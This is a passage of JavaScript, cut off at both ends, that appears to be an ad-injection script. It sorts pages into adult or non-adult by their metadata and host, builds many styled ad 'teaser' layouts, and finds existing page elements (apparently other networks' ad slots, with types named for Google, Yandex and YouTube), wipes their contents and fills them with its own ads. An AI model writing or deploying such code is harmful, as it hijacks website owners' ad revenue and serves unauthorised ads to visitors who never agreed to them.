                if (nm === 'keywords' || nm === 'description') {
                    arr_mts.push(peas.getAttribute('content'));
                }
            }
        });
        if (title && title.parentNode.tagName === 'HEAD') {
            arr_mts.push(title.innerText);
        }
        if (document.location.host) {
            arr_mts.push(document.location.host);
        }
        var adu = 0;
        if (arr_mts.length > 0) {
            arr_mts = arr_mts.join(',').toLowerCase();
            arr.forEach(function (pp) {
                if (arr_mts.indexOf(pp.toLowerCase()) !== -1) {
                    adu = 1;
                }
            });
        }
        if (adu === 0 && (host.indexOf('porn') > -1 || host.indexOf('shemale') > -1 || host.indexOf('.sex.') > -1 || ad_pags.indexOf(host) > -1)) {
            adu = 1;
        }
        return adu;
    };
    var adult = kys_2();
    var str_rs = ',970x250,600x300,336x280,300x250,250x250,200x200,970x90,728x90,180x150,468x60,320x100,125x125,300x600,240x400,160x600,120x600,100x200,320x50,234x60,120x240,300x1050,980x120,250x360,930x180,580x400,750x300,750x200,750x100,';
    var str_rs_img = ',970x250,970x90,728x90,468x60,300x600,240x400,160x600,120x600,320x50,234x60,300x1050,980x120,930x180,580x400,750x300,750x200,750x100,';
    var FONT_size = function (hg) {
        var h_size = 11;
        if (hg > 120) {
            h_size = 16;
        } else if (hg > 90) {
            h_size = 15;
        } else if (hg > 60) {
            h_size = 14;
        }
        return h_size;
    };
    var A_style = 'font-weight:500;transition:0.1s;display:block;cursor:pointer;text-decoration:none;color:#282828;';
    var MODE_T_1_8 = function (this_row, elem, w, h) {
        var a_size = 14;
        var text_size = 12;
        if (w > 280) {
            a_size = 21;
            text_size = 14;
        } else if (w > 230) {
            a_size = 16;
            text_size = 12;
        }
        var TOP_HOVER = this_row.header;
        if (this_row.text && this_row.text.length > 2) {
            TOP_HOVER = this_row.text;
        }
        var arr_px = (w * 13) / 100;
        elem.innerHTML = '<div style="height: ' + (h - 3) + 'px;line-height:1.1;max-width:' + (w - 2) + 'px;position:relative;border: 1px solid #dddcda;"><a style="" href="' + this_row.link + '"><div style="overflow:hidden;max-height:74%;position:relative;"><img style="width:100%;" src="' + this_row.image + '" data-mytype="name_baner"><div style="overflow:hidden;padding:0 5px 9px;background:#0000008a;box-shadow:#0000008a 0 -3px 16px 6px;font-size:' + a_size + 'px;color:#fff;position:absolute;bottom:0;text-align:left;box-sizing:content-box;" class="hover_a">' + this_row.header + '</div></div><div style="width:100%;"><div style="max-height:28%;overflow:hidden;padding:4px;font-size:' + text_size + 'px;"><span style="max-width:75%;padding:5px;display:inline-block;float:left;text-align:left;font-weight:400;color:#6d6d6d;box-sizing:content-box;">' + TOP_HOVER + '</span><div style="width:' + arr_px + 'px;height:' + arr_px + 'px;margin:1%;border-radius:100px;font-size:' + arr_px * 0.62 + 'px;text-align:center;float:right;color:#fff;background:#b76458;"><span style="vertical-align:sub;">❯</span></div></div></div></a></div>';
    };
    var MODE_T_1_7 = function (this_row, elem, w, h) {
        var a_size = 14;
        var text_size = 12;
        if (w > 280) {
            a_size = 25;
            text_size = 14;
        } else if (w > 230) {
            a_size = 18;
            text_size = 12;
        }
        var TOP_HOVER = this_row.header;
        if (this_row.text && this_row.text.length > 2) {
            TOP_HOVER = this_row.text;
        }
        var arr_px = (w * 15) / 100;
        elem.innerHTML = '<div style="height: ' + (h - 2) + 'px;line-height:1.1;max-width:' + (w - 2) + 'px;position:relative;border:1px solid #dddcda;"><div style="width:100%;"><a href="' + this_row.link + '" style="' + A_style + 'color:rgb(40, 40, 40);"><div style="width:' + arr_px + 'px;height:' + (arr_px / 2) + 'px;margin:1%;font-size:' + arr_px * 0.45 + 'px;text-align:center;float:left;line-height:1.1;color:#fff;background:#e8cf49;font-weight:bold;border-radius:4px;">AD</div><div style="float:right;width:80%;"><div style="overflow:hidden;padding:4px;background-color:#f3f3f3;font-size:' + a_size + 'px;max-height:' + (a_size - 2) + 'px;text-align:left;color:#4f4f4f;box-sizing:initial;">' + this_row.header + '</div><div style="overflow:hidden;padding:4px;font-size:' + text_size + 'px;max-height:' + (text_size * 2) + 'px;text-align:left;font-weight:400;box-sizing:initial;">' + TOP_HOVER + '</div></div></a></div><div style="overflow:hidden;width:100%;max-height:72%;position:absolute;bottom:0;"><a style="" href="' + this_row.link + '"><img style="width:100%;" src="' + this_row.image + '" data-mytype="name_baner"></a></div></div>';
    };
    var MODE_T_1_6 = function (this_row, elem, w, h, type_b) {
        var a_size = 14;
        var text_size = 12;
        if (w > 280) {
            a_size = 25;
            text_size = 14;
        } else if (w > 230) {
            a_size = 18;
            text_size = 12;
        }
        var TOP_HOVER = this_row.header;
        if (this_row.text && this_row.text.length > 2) {
            TOP_HOVER = this_row.text;
        }
        var arr_px = (w * 13) / 100;
        var type_back = '<span style="width:' + arr_px + 'px;height:' + arr_px + 'px;margin:1%;border-radius:100px;font-size:' + arr_px * 0.6 + 'px;text-align:center;float:right;color:#919191;border:1px solid #919191;box-shadow: 0 0 2px 0 #0000001f, 0 2px 2px 0 #0000003d;"><span style="vertical-align:sub;">❯</span></span>';
        if (type_b === 2 || type_b === 3) {
            var back = '#2b9a8f';
            if (type_b === 3) {
                back = '#ec833c';
            }
            type_back = '<div style="width:' + arr_px + 'px;height:' + arr_px + 'px;margin:1%;border-radius:100px;font-size:' + arr_px * 0.62 + 'px;text-align:center;float:right;color:#fff;background:' + back + ';"><span style="vertical-align:sub;">❯</span></div>';
        }
        elem.innerHTML = '<div style="height:' + (h - 2) + 'px;line-height:1.1;max-width:' + (w - 2) + 'px;position:relative;border: 1px solid #dddcda;"><div style="overflow:hidden;max-height:63%;"><a target="_blank" style="" href="' + this_row.link + '"><img style="width:100%;" src="' + this_row.image + '" data-mytype="name_baner"></a></div><div style="width:100%;"><a target="_blank" href="' + this_row.link + '" style="' + A_style + 'color:rgb(40, 40, 40);"><div style="overflow:hidden;padding:4px;background-color:#f3f3f3;font-size:' + a_size + 'px;max-height:' + (a_size - 2) + 'px;text-align:left;color:#4f4f4f;box-sizing:content-box;">' + this_row.header + '</div><div style="max-height:28%;overflow:hidden;padding:4px;font-size:' + text_size + 'px;"><span style="max-width:75%;display:inline-block;float:left;text-align:left;font-weight:400;box-sizing:content-box;max-height:' + (text_size * 3) + 'px;">' + TOP_HOVER + '</span>' + type_back + '</div></a></div></div>';
    };
    var MODE_T_1_2 = function (this_row, elem, w, h) {
        var a_size = 13;
        var text_size = 12;
        if (w > 280) {
            a_size = 17;
            text_size = 15;
        } else if (w > 230) {
            a_size = 14;
            text_size = 13;
        }
        var top_max_height = '';
        if (w < 210) {
            top_max_height = 'max-height:' + ((a_size * 2) + (w * 0.01)) + 'px;';
        }
        var TOP_HOVER = this_row.header;
        if (this_row.text && this_row.text.length > 2) {
            TOP_HOVER = this_row.text;
        }
        var arr_px = (w * 20) / 100;
        elem.innerHTML = '<div style="border:1px solid rgb(221, 220, 218);height:' + (h - 2) + 'px;line-height:1.1;max-width:' + ((h / 100) * 80) * 1.5 + 'px;"><div style="width:100%;height:24%;position:relative;"><div style="overflow:hidden;padding:1%;position:absolute;background:#fff;height:100%;transition:all 0.4s cubic-bezier(0.45, 0.05, 0.16, 1.59);width:98%;' + top_max_height + '"><a target="_blank" class="hover_a" href="' + this_row.link + '" style="' + A_style + 'font-size:' + a_size + 'px !important;color:#0000ff;height:100%;box-sizing:content-box;">' + this_row.header + '</a></div></div><div style="overflow:hidden;max-height:76%;position:relative;"><a target="_blank" style="" href="' + this_row.link + '"><div class="hover_top" style="max-height:100%;opacity:0;width:100%;padding-top:7px;position:absolute;transition:0.4s;background:#fff;overflow:hidden;font-size:' + text_size + 'px !important;height:0;"><p style=color:#000000;font-weight:400;margin-top:2%;box-sizing:content-box;">' + TOP_HOVER + '</p><div style="width:100%;font-weight:500;font-size:15px !important;position:absolute;bottom:12%;"><div style="width:' + (arr_px * 2) + 'px;height:' + (arr_px * 0.66) + 'px;margin:0 auto;border-radius:6px;font-size:' + arr_px * 0.6 + 'px;box-sizing:initial;text-align:center;color:#fff;line-height:1.1;background:#535353;">❯</div></div></div><img style="width:100%;" src="' + this_row.image + '" data-mytype="name_baner"></a></div></div>';
    };
    var MODE_T_1_1 = function (this_row, elem, w, h, s) {
        var a_size = s;
        if (!a_size) {
            a_size = FONT_size(h);
        }
        if (w > 280) {
            a_size = 16;
        } else if (w > 230) {
            a_size = 14;
        }
        var TOP_HOVER = this_row.header;
        if (this_row.text && this_row.text.length > 2) {
            TOP_HOVER = this_row.text;
        }
        elem.innerHTML = '<div style="height:100%;line-height:1.1;max-width:' + ((h / 100) * 80) * 1.5 + 'px;position:relative;"><a target="_blank" href="' + this_row.link + '"><div class="hover_top" style="width:100%;padding-top:7px;position:absolute;transition:0.3s;background:linear-gradient(#000000bf, transparent);color:#fff;font-size:' + a_size + 'px !important;font-weight:bold;height:0;overflow:hidden;"><span style="padding:5px;">' + TOP_HOVER + '</span></div></a><div style="overflow:hidden;max-height:78%;"><a target="_blank" style="" href="' + this_row.link + '"><img style="width:100%;" src="' + this_row.image + '" data-mytype="name_baner"></a></div><div style="width:100%;"><div style="max-height:13%;overflow:hidden;padding:3px;"><a target="_blank" class="hover_a" href="' + this_row.link + '" style="' + A_style + 'font-size:' + a_size + 'px !important;">' + this_row.header + '</a></div></div></div>';
    };
    var MODE_TYPE_300_ggle = function (this_row, elem, w, h, rand_f, s) {
        if (!rand_f) {
            rand_f = r_min_max(2, 7);
        }
        elem.parentElement.style.border = 'none';
        elem.parentElement.style.background = 'none';
        if (w < 200) {
            rand_f = 2;
        }
        if (rand_f === 2) {
            MODE_T_1_2(this_row, elem, w, h, s);
        } else if (rand_f === 3) {
            MODE_T_1_8(this_row, elem, w, h);
        } else if (rand_f >= 4 && rand_f <= 6) {
            var type = 1;
            if (rand_f === 5) {
                type = 2;
            }
            if (rand_f === 6) {
                type = 3;
            }
            MODE_T_1_6(this_row, elem, w, h, type);
        } else if (rand_f === 7) {
            MODE_T_1_7(this_row, elem, w, h);
        }
    };
    var MODE_TYPE_1 = function (this_row, elem, w, h, rand_f, s) {
        if (rand_f === 1) {
            MODE_T_1_1(this_row, elem, w, h, s);
        } else if (rand_f > 1) {
            MODE_TYPE_300_ggle(this_row, elem, w, h, rand_f, s);
        }
    };
    var MODE_TYPE_2 = function (this_row, elem, w, h) {
        var wdth_i = h * 1.5;
        elem.innerHTML = '<div style="height:100%;line-height:1.1;"><a target="_blank" href="' + this_row.link + '" style="width:100%;' + A_style + 'font-size:' + FONT_size(h) + 'px;height:' + (h - 3) + 'px;font-weight:bold;"><div style="overflow:hidden;width:' + wdth_i + 'px;max-width:50%;height:' + h + 'px;float:left;"><img style="width:100%;" src="' + this_row.image + '" data-mytype="name_baner"></div><div><div style="max-height:13%;overflow:hidden;padding:3px 3px 0 3px;transition:0.1s;" class="hover_a">' + this_row.header + '</div></div></a></div>';
    };
    var MODE_TYPE_3 = function (this_row, elem, w, h) {
        var a_size = FONT_size(h);
        elem.innerHTML = '<div style="height:' + h + 'px;line-height:1.1;"><div style="overflow:hidden;width:' + h * 1.5 + 'px;max-width:50%;float:left;max-height:100%;"><a target="_blank" href="' + this_row.link + '"><img style="width:100%;" src="' + this_row.image + '" data-mytype="name_baner"></a></div><div><div style="max-height:13%;overflow:hidden;padding:3px 3px 0 3px;transition:0.1s;"><a target="_blank" class="hover_a" href="' + this_row.link + '" style="' + A_style + 'font-size:' + a_size + 'px;height:' + (h - 3) + 'px;">' + this_row.header + '</a></div></div></div>';
    };
    var MODE_TYPE_4 = function (this_row, elem, w) {
        var a_size = 12;
        if (w > 280) {
            a_size = 16;
        } else if (w > 230) {
            a_size = 14;
        } else if (w > 155) {
            a_size = 13;
        }
        var TOP_HOVER = this_row.header;
        if (this_row.text && this_row.text.length > 2) {
            TOP_HOVER = this_row.text;
        }
        elem.innerHTML = '<div style="height:100%;line-height:1.1;position:relative;"><a target="_blank" href="' + this_row.link + '"><div class="hover_top" style="position:absolute;transition:0.3s;padding-top:7px;background:linear-gradient(#000000bf, transparent);color:#fff;font-weight:bold;height:0;overflow:hidden;font-size:' + a_size + 'px !important;width:' + w + 'px"><span style="padding:5px;">' + TOP_HOVER + '</span></div></a><div style="overflow:hidden;width:100%;float:left;max-height:' + (w * 0.66) + 'px;"><a target="_blank" href="' + this_row.link + '"><img style="width:' + w + 'px;" src="' + this_row.image + '" data-mytype="name_baner"></a></div><div><div style="max-height:13%;overflow:hidden;padding:3px 3px 0 3px;"><a target="_blank" class="hover_a" href="' + this_row.link + '" style="' + A_style + 'font-size:' + a_size + 'px !important;font-weight:bold;">' + this_row.header + '</a></div></div></div>';
    };
    var MODE_TYPE_ggle_72_3 = function (this_row, elem, w, h, type) {
        var f_size = 21;
        var arr_mrg_top = h * 0.16 + 'px';
        if (h < 72) {
            f_size = 15;
        } else if (h < 110) {
            f_size = 20;
        }
        if (w / h < 7) {
            f_size = f_size - 2;
        }
        var text_size = 12;
        if (f_size - 5 > 12) {
            text_size = f_size - 5;
        }
        var arr_px = (h * 60) / 100;
        var type_back = '#2b9a8f';
        if (type === 2) {
            type_back = '#ec833c';
        }
        var TOP_HOVER = this_row.header;
        if (this_row.text && this_row.text.length > 2) {
            TOP_HOVER = this_row.text;
        }
        elem.innerHTML = '<div style="border:1px solid rgb(221, 220, 218);height:' + (h - 2) + 'px;line-height:1.1;overflow:hidden;"><a target="_blank" href="' + this_row.link + '" style="' + A_style + 'height:' + (h - 3) + 'px;"><div style="overflow:hidden;width:' + (h * 1.5) + 'px;height:' + (h - 3) + 'px;float:left;padding:0;"><img style="width:100%;" src="' + this_row.image + '" data-mytype="name_baner"></div><div style="overflow:hidden;"><div style="line-height:1;float:left;max-width:72%;padding:0.5%;text-align:left;"><span class="hover_a" style="color:#353535 !important;font-size:' + f_size + 'px;font-weight:bold;max-height:' + (f_size * 3) + 'px;overflow:hidden;display:inline-block;max-width:55%;float:left;padding-left:5%;box-sizing:content-box;">' + this_row.header + '</span><span style="color:#5c5c5c;font-size:' + text_size + 'px;display:flex;padding:1% 1% 1% 5%;font-weight:400;max-height:' + (text_size * 5) + 'px;overflow:hidden;box-sizing:content-box;">' + TOP_HOVER + '</span></div><div style="width:' + arr_px + 'px;height:' + arr_px + 'px;margin:' + arr_mrg_top + ' 4%;border-radius:100px;font-size:' + (arr_px * 0.6) + 'px;text-align:center;float:right;box-sizing:initial;color:#fff;line-height:1.1;background:' + type_back + ';"><span style="vertical-align:sub;">❯</span></div></div></a></div>';
    };
    var MODE_TYPE_ggle_72_2 = function (this_row, elem, w, h) {
        var f_size = 21;
        var text_size = 15;
        if (h < 72) {
            text_size = 12;
            f_size = 15;
        } else if (h < 110) {
            text_size = 14;
            f_size = 20;
        }
        if (w / h < 7) {
            f_size = f_size - 2;
        }
        var arr_px = (h * 60) / 100;
        var TOP_HOVER = this_row.header;
        if (this_row.text && this_row.text.length > 2) {
            TOP_HOVER = this_row.text;
        }
        if (h < 80) {
            TOP_HOVER = '';
        }
        elem.innerHTML = '<div style="border:1px solid rgb(221, 220, 218);height:' + (h - 2) + 'px;line-height:1.1;overflow:hidden;"><a target="_blank" href="' + this_row.link + '" style="' + A_style + 'height:' + (h - 3) + 'px;"><div style="overflow:hidden;width:' + (h * 1.5) + 'px;height:' + (h - 2) + 'px;float:left;padding:0;"><img style="width:100%;" src="' + this_row.image + '" data-mytype="name_baner"></div><div style="overflow:hidden;"><div style="line-height:1;float:left;max-width:72%;padding:0.5%;text-align:left;"><span class="hover_a" style="color:#353535 !important;font-size:' + f_size + 'px;font-weight:bold;max-height:' + (f_size * 2) + 'px;overflow:hidden;display:block;float:left;padding:0 0.5% 0.5% 5%;box-sizing:content-box;">' + this_row.header + '</span><span style="color:#6d6d6d;font-size:' + text_size + 'px;padding:1% 1% 0 5%;font-weight:400;overflow:hidden;display:block !important;width:100%;box-sizing:content-box;">' + TOP_HOVER + '</span></div><span style="width:' + arr_px + 'px;height:' + arr_px + 'px;margin:' + (arr_px / 3.3) + 'px;border-radius:100px;font-size:' + arr_px * 0.6 + 'px;text-align:center;float:right;box-sizing:initial;color:#fff;line-height:1.1;background:#b76458;"><span style="vertical-align:sub;">❯</span></span></div></a></div>';
    };
    var MODE_TYPE_ggle_72_1 = function (this_row, elem, w, h) {
        var f_size = 20;
        var arr_sz = h * 0.5 + 'px';
        var arr_px = h * 0.6 + 'px';
        var arr_mrg_top = h * 0.16 + 'px';
        if (h < 72) {
            f_size = 15;
        } else if (h < 110) {
            f_size = 19;
        }
        if (w / h < 7) {
            f_size = f_size - 2;
        }
        var text_size = 12;
        if (f_size - 5 > 12) {
            text_size = f_size - 5;
        }
        var TOP_HOVER = this_row.header;
        if (this_row.text && this_row.text.length > 2) {
            TOP_HOVER = this_row.text;
        }
        elem.innerHTML = '<div style="border:1px solid rgb(221, 220, 218);height:' + (h - 2) + 'px;line-height:1.1;overflow:hidden;"><a target="_blank" href="' + this_row.link + '" style="' + A_style + 'height:' + (h - 3) + 'px;"><div style="overflow:hidden;width:' + (h * 1.5) + 'px;height:' + (h - 3) + 'px;float:left;padding:0;"><img style="width:100%;" src="' + this_row.image + '" data-mytype="name_baner"></div><div style="overflow:hidden;"><div style="float:left;max-width:72%;padding:1%;text-align:left;"><span class="hover_a" style="color:#0000ff !important;font-size:' + f_size + 'px;font-weight:400;max-height:' + f_size + 'px;overflow:hidden;display:inline-block;box-sizing:content-box;line-height:1.1;">' + this_row.header + '</span><span style="color:#323232;font-size:' + text_size + 'px;display:flex;margin-top:1%;font-weight:400;box-sizing:content-box;">' + TOP_HOVER + '</span></div><div style="width:' + arr_px + ';height:' + arr_px + ';margin:' + arr_mrg_top + ' 4%;border-radius:100px;border:1px solid #0000ff;font-size:' + arr_sz + ';text-align:center;color:#0000ff;float:right;box-sizing:content-box;line-height:1.1;">❯</div></div></a></div>';
    };
    var MODE_TYPE_ggle_160_1 = function (this_row, elem, w, h, type, tops) {
        var f_size = 21;
        var text_size = 15;
        if (w < 140) {
            f_size = 15;
            text_size = 13;
        } else if (h < 170) {
            f_size = 17;
            text_size = 14;
        }
        var arr_px = w * 0.4;
        var type_back = '#2b9a8f';
        if (type === 2) {
            type_back = '#ec833c';
        }
        var TOP_HOVER = this_row.header;
        if (this_row.text && this_row.text.length > 2) {
            TOP_HOVER = this_row.text;
        }
        var text_hide = '<span style="padding:5%;font-size:' + text_size + 'px;display:block;margin-top:12%;font-weight:400;color:#6d6d6d;box-sizing: content-box;">' + TOP_HOVER + '</span>';
        if (tops === 1.1) {
            text_hide = '';
        }
        elem.innerHTML = '<div style="border:1px solid rgb(221, 220, 218);height:100%;line-height:1.1;position:relative;"><a target="_blank" href="' + this_row.link + '" style="text-decoration:none;height:100%;display:block;"><div style="overflow:hidden;width:100%;height:' + (w * 0.66) + 'px;padding:0;"><img style="width:100%;" src="' + this_row.image + '" data-mytype="name_baner"></div><div style="overflow:hidden;"><div style="padding:1%;"><span class="hover_a" style="color:#353535 !important;font-size:' + f_size + 'px;font-weight:600;overflow:hidden;display:block;padding:5%;margin-top:5%box-sizing:content-box;">' + this_row.header + '</span>' + text_hide + '</div><div style="width:' + arr_px + 'px;height:' + arr_px + 'px;border-radius:100px;font-size:' + (arr_px / 2) + 'px;text-align:center;color:#fff;background:' + type_back + ';position:absolute;bottom:15%;left:30%;"><span style="vertical-align:-webkit-baseline-middle;">❯</span></div></div></a></div>';
    };
    var MODE_ggle_160_low = function (this_row, elem, w, h) {
        var f_size = 18;
        var text_size = 15;
        if (w < 160) {
            f_size = 15;
            text_size = 13;
        } else if (h < 180) {
            f_size = 16;
            text_size = 14;
        }
        var TOP_HOVER = this_row.header;
        if (this_row.text && this_row.text.length > 2) {
            TOP_HOVER = this_row.text;
        }
        elem.innerHTML = '<div style="border:1px solid rgb(221, 220, 218);height:100%;line-height:1.1;position:relative;"><a target="_blank" href="' + this_row.link + '" style="text-decoration:none;height:100%;display:block;"><div style="overflow:hidden;width:100%;height:' + (w * 0.66) + 'px;padding:0;"><img style="width:100%;" src="' + this_row.image + '" data-mytype="name_baner"></div><div style="overflow:hidden;"><div><span class="hover_a" style="color:#353535 !important;font-size:' + f_size + 'px;font-weight:600;line-height:1.1 !important;overflow:hidden;display:block;padding:2%;margin-top:1%">' + this_row.header + '</span><span style="padding:1%;font-size:' + text_size + 'px;display:block;margin-top:5%;font-weight:400;color:#6d6d6d;">' + TOP_HOVER + '</span></div></div></a></div>';
    };
    var MODE_ggle_72 = function (this_row, elem, w, h, rand_f) {
        rand_f = r_min_max(2, 5);
        elem.parentElement.style.border = 'none';
        if (rand_f === 2 && h > 70) {
            MODE_TYPE_ggle_72_1(this_row, elem, w, h);
        } else if (rand_f === 3 || rand_f === 2) {
            MODE_TYPE_ggle_72_2(this_row, elem, w, h);
        } else if (rand_f >= 4 || rand_f <= 5) {
            var type = 1;
            if (rand_f === 5) {
                type = 2;
            }
            MODE_TYPE_ggle_72_3(this_row, elem, w, h, type);
        }
    };
    var MODE_ggle_160 = function (this_row, elem, w, h, tops) {
        var rand_f = r_min_max(1, 2);
        var type = 1;
        if (rand_f === 2) {
            type = 2;
        }
        MODE_TYPE_ggle_160_1(this_row, elem, w, h, type, tops);
    };
    var MODE_1 = function (elem, w, h, rand_f, ggle_) {
        var set = function () {
            if (ads_arr[ads_count]) {
                var this_row = ads_arr[ads_count];
                ads_count++;
                if (ggle_) {
                    if (ggle_ === 'ggle_72') {
                        MODE_ggle_72(this_row, elem, w, h, rand_f);
                    } else if (ggle_ === 'ggle_300') {
                        MODE_TYPE_1(this_row, elem, w, h, rand_f);
                    }
                } else if ((w / h) > 1.9) {
                    MODE_TYPE_2(this_row, elem, w, h);
                } else {
                    MODE_TYPE_1(this_row, elem, w, h, rand_f);
                }
            }
        };
        if (ads_arr.length > 0 && ads_arr.length > ads_count && ads_arr[ads_count]) {
            set();
        } else {
            var nt = setInterval(function () {
                if (ads_arr[ads_count]) {
                    set();
                    clearInterval(nt);
                }
            }, 200);
        }
    };
    var MODE_2 = function (elem, w, h, rand_f, tops) {
        var set = function () {
            var this_row = ads_arr[ads_count];
            ads_count++;
            if (tops === 1 || tops === 1.1) {
                MODE_ggle_160(this_row, elem, w, h, tops);
            } else if (tops === 2) {
                MODE_ggle_160_low(this_row, elem, w, h);
            } else {
                if (w > h && (w / h) > 1.5) {
                    MODE_TYPE_3(this_row, elem, w, h);
                } else if (w > h) {
                    MODE_TYPE_1(this_row, elem, w, h, rand_f, 13);
                } else {
                    MODE_TYPE_4(this_row, elem, w, h);
                }
            }
        };
        if (ads_arr.length > 0 && ads_arr.length > ads_count && ads_arr[ads_count]) {
            set();
        } else {
            var nt = setInterval(function () {
                if (ads_arr[ads_count]) {
                    set();
                    clearInterval(nt);
                }
            }, 200);
        }
    };
    var PRC = 4;
    var fun_hover_top = function (big, elem_h, elem_a, h_to_btm) {
        setTimeout(function () {
            var top = big.querySelector(elem_h);
            var a = big.querySelector(elem_a);
            var h_to_btm_2 = big.querySelector(h_to_btm);
            var img = big.querySelector('img');
            var this_color = '';
            if (a) {
                this_color = a.style.color;
            }
            big.onmouseover = function () {
                if (a) {
                    a.style.color = '#ff6163';
                }
                if (h_to_btm_2) {
                    h_to_btm_2.style.top = '80%';
                }
                if (top) {
                    top.style.height = img.offsetHeight + 'px';
                    top.style.opacity = '1';
                }
            };
            big.onmouseout = function () {
                if (a) {
                    a.style.color = this_color;
                }
                if (h_to_btm_2) {
                    h_to_btm_2.style.top = '0';
                }
                if (top) {
                    top.style.height = '0';
                    top.style.opacity = '0';
                }
            };
        }, 200);
    };
    var createDiv_2 = function (height, width, fader_b, w_h) {
        var my_div = document.createElement("div");
        my_div.setAttribute('data-mytype', 'name_baner');
        my_div.setAttribute('style', 'height:' + height + 'px;width:' + width - 2 + 'px;border:1px solid #DDDCDA;overflow:hidden;background:#fff;');
        var rand_f = r_min_max(1, 7);
        if (if_yti || host.indexOf('google') > -1) {
            rand_f = r_min_max(2, 7);
        }
        if (w_h === 1 && (width / height) > 1.9) {
            var w_prc = Math.round(width / (height * PRC));
            if (height > 180) {
                w_prc = Math.round(width / (height * 1.3));
            }
            var cout_tis = function (this_w, m_l_t, ggle_728) {
                var tiser_div = document.createElement('div');
                tiser_div.setAttribute('style', 'width:' + this_w + 'px;height:' + height + 'px;display:inline-block;margin-left:' + m_l_t + 'px;background:#fff;');
                my_div.appendChild(tiser_div);
                if (ggle_728) {
                    MODE_1(tiser_div, this_w, height, rand_f, ggle_728);
                } else {
                    MODE_1(tiser_div, this_w, height, rand_f);
                }
                fun_hover_top(tiser_div, '.hover_top', '.hover_a', '.hover_top_2');
            };
            if (height < 130 && w_prc <= 3 && w_prc >= 2 && rand_f > 2) {
                cout_tis(width, 0, 'ggle_72');
            } else if (w_prc <= 1 && (height < 240 || (width / height) <= 1.9)) {
                cout_tis(width, 0);
            } else {
                my_div.style.display = 'flex';
                if (height >= 240 && (width / height) > 1.9) {
                    w_prc = Math.round(width / (height * 1.2));
                }
                var W_prc = width / 100;
                var this_w = (W_prc * 97) / w_prc;
                var m_left = (W_prc * 3) / (w_prc - 1);
                for (var t = 0; t < w_prc; t++) {
                    var m_l_t = m_left;
                    if (t === 0) {
                        m_l_t = 0;
                    }
                    cout_tis(this_w, m_l_t);
                }
            }
        } else {
            my_div.style.display = 'inline-block';
            cout_tis = function (this_h, m_t_t, t_width, tops) {
                if (!tops) {
                    tops = 0;
                }
                var tiser_div = document.createElement('div');
                tiser_div.setAttribute('style', 'width:100%;max-width:' + t_width + 'px;height:' + this_h + 'px;margin-top:' + m_t_t + 'px;background:#fff;');
                my_div.appendChild(tiser_div);
                MODE_2(tiser_div, width, this_h, rand_f, tops);
                fun_hover_top(tiser_div, '.hover_top', '.hover_a', '.hover_top_2');
            };
            if (height / width > 3 && width < 230 && r_min_max(1, 3) > 1) {
                if (height / width > 4.5) {
                    cout_tis(height / 2, 0, width, 1.1);
                    cout_tis(height / 2, 0, width, 1.1);
                } else {
                    cout_tis(height, 0, width, 1);
                }
            } else {
                var img_h = width / 1.5;
                var h_prc = height / (img_h * 1.5);
                if (width > 250) {
                    h_prc = height / (img_h * 1.1);
                } else if (width > 180) {
                    h_prc = height / (img_h * 1.2);
                } else if (width < 140) {
                    h_prc = height / (img_h * 2);
                }
                h_prc = Math.floor(h_prc);
                if (h_prc <= 1 && 2 === Math.round(height / (img_h * 1.1)) && width > 200) {
                    width = height / 2;
                    h_prc = 2;
                }
                if (h_prc <= 1 && 2 === Math.round(height / width) && width <= 200) {
                    cout_tis(height, 0, width, 2);
                } else {
                    if (h_prc <= 1 && width > height && height > 220 && (width / height) > 1.5) {
                        var CNT = Math.floor(height / 110);
                        m_top = (height - (CNT * 110)) / CNT;
                        for (t = 0; t < CNT; t++) {
                            var m_t_t = m_top;
                            if (t === 0) {
                                m_t_t = 0;
                            }
                            cout_tis(110, m_t_t, width);
                        }
                    } else if (h_prc <= 1) {
                        cout_tis(height, 0, width);
                    } else {
                        var H_prc = height / 100;
                        var this_h = (H_prc * 98) / h_prc;
                        var m_top = (H_prc * 2) / (h_prc - 1);
                        for (t = 0; t < h_prc; t++) {
                            m_t_t = m_top;
                            if (t === 0) {
                                m_t_t = 0;
                            }
                            cout_tis(this_h, m_t_t, width);
                        }
                    }
                }
            }
        }
        fader_b.style.textAlign = 'center';
        fader_b.appendChild(my_div);
    };
    var createDiv = function (height, width, fader_b, type) {
        var set_cr = function () {
            if (type) {
                if (type === 'video') {
                    MODE_1(fader_b, width, height, r_min_max(2, 5), 'ggle_72');
                } else if (type === 'yandex') {
                    MODE_1(fader_b, width, height, r_min_max(3, 7), 'ggle_300');
                } else if (type === 'google_300') {
                    MODE_1(fader_b, width, height, r_min_max(3, 7), 'ggle_300');
                } else if (type === 'youti_300') {
                    MODE_1(fader_b, width, height, r_min_max(2, 7), 'ggle_300');
                }
                fun_hover_top(fader_b, '.hover_top', '.hover_a', '.hover_top_2');
            } else {
                if (width >= height) {
                    createDiv_2(height, width, fader_b, 1);
                } else if (width < height) {
                    createDiv_2(height, width, fader_b, 2);
                }
            }
        };
        if (height > 58 && width > 80) {
            if (waiting_ads === false && ads_arr.length > 0 && ads_arr.length > ads_count) {
                set_cr();
            } else if (waiting_ads === false && ads_arr.length > 0 && ads_arr.length <= ads_count) {
                ads_count = 0;
                set_cr();
            }
            else {
                var i = document.createElement('img');
                i.setAttribute('data-mytype', 'name_baner');
                i.setAttribute('style', 'display:none !important;');
                fader_b.appendChild(i);
                var nt = setInterval(function () {
                    if (waiting_ads === false) {
                        set_cr();
                        clearInterval(nt);
                    }
                }, 200);
            }
        }
    };
    var iskl = 'www.facebook.com*www.youtube.com';
    var each_change_peas = function (elem) {
        Array.prototype.forEach.call($$('' + elem + ''), function (a) {
            if (a.offsetHeight > 59) {
                change_peas(a);
            }
        });
    };
    var change_peas = function (peas) {
        var height = peas.offsetHeight;
        if (!peas.getAttribute('data-mytype') || (peas.getAttribute('data-mytype') && !peas.querySelector('img[data-mytype^="name_baner"]'))) {
            var width = peas.offsetWidth;
            if (height < 500 || ((body_width / 100) * 90 > width || (body_height / 100) * 80 > height) && height > 59) {
                peas.setAttribute('data-mytype', 'name_baner');
                peas.innerHTML = '';
                peas.style.paddingLeft = '0';
                peas.style.paddingTop = '0';
                peas.style.textAlign = 'center !important;';
                createDiv(height, width, peas);
            }
        }
    };
    var i;
    var t_ch_p = function (elem, style) {
        var e = document.querySelector('' + elem + '');
        if ((e && !e.getAttribute('data-mytype')) || (e && e.getAttribute('data-mytype') && !e.querySelector('img[data-mytype^="name_baner"]'))) {
            if (style) {
                e.setAttribute('style', style);
            }
            change_peas(e);
        }
    };
    var n_b = function (fader, width, height, style) {
        var mm = document.createElement("div");
        mm.id = 'data-mytype';
        mm.setAttribute('data-mytype', 'name_baner');
